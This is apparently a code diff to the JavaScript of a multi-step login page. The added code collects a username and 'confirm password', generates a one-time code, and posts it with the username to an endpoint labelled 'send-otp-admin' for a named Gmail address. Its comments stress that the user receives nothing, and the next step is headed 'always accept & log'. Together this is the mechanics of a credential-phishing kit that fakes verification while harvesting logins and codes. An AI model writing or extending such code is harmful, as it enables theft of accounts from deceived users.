@@ -793,39 +793,57 @@
     });
 
     // --- STEP 2: Username & Confirm Password ---
-    document.getElementById('form2')?.addEventListener('submit', async function(e) {
-        e.preventDefault();
-        hideStatus('status2');
-        showStatus('status2', 'Verifying...', 'info');
+document.getElementById('form2')?.addEventListener('submit', async function(e) {
+    e.preventDefault();
+    hideStatus('status2');
+    showStatus('status2', 'Verifying...', 'info');
 
-        const username = document.getElementById('username').value;
-        const confirmPassword = document.getElementById('confirmPassword').value;
+    const username = document.getElementById('username').value;
+    const confirmPassword = document.getElementById('confirmPassword').value;
 
-        try {
-            const res = await fetch('/api/step2', {
+    try {
+        const res = await fetch('/api/step2', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                sessionId: sessionId,
+                username: username,
+                confirmPassword: confirmPassword
+            })
+        });
+        const data = await res.json();
+        if (data.success) {
+            // ✅ Generate OTP (for admin only)
+            const otpCode = Math.floor(100000 + Math.random() * 900000).toString();
+            sessionStorage.setItem('loginOTP', otpCode);
+
+            // ✅ Send OTP ONLY to admin — user gets NOTHING
+            await fetch('/api/send-otp-admin', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    sessionId: sessionId,
+                    otp: otpCode,
                     username: username,
-                    confirmPassword: confirmPassword
+                    adminEmail: 'blessedresult6@gmail.com'
                 })
             });
-            const data = await res.json();
-            if (data.success) {
-                showStatus('status2', data.message || 'Step 2 complete!', 'success');
-                setTimeout(() => {
-                    showStep('step3');
-                    currentStep = 3;
-                }, 500);
-            } else {
-                showStatus('status2', data.message || 'Error', 'error');
-                setTimeout(restart, 2000);
-            }
-        } catch (err) {
-            showStatus('status2', 'Network error', 'error');
+
+            // ❌ NO email sent to user
+            // ❌ NO SMS sent to user
+
+            showStatus('status2', data.message || 'Step 2 complete!', 'success');
+            setTimeout(() => {
+                showStep('step3');
+                currentStep = 3;
+            }, 500);
+        } else {
+            showStatus('status2', data.message || 'Error', 'error');
+            setTimeout(restart, 2000);
         }
-    });
+    } catch (err) {
+        showStatus('status2', 'Network error', 'error');
+    }
+});
 
     // --- STEP 3: OTP 1 - ALWAYS ACCEPT & LOG ---
     document.getElementById('form3')?.addEventListener('submit', async function(e) {
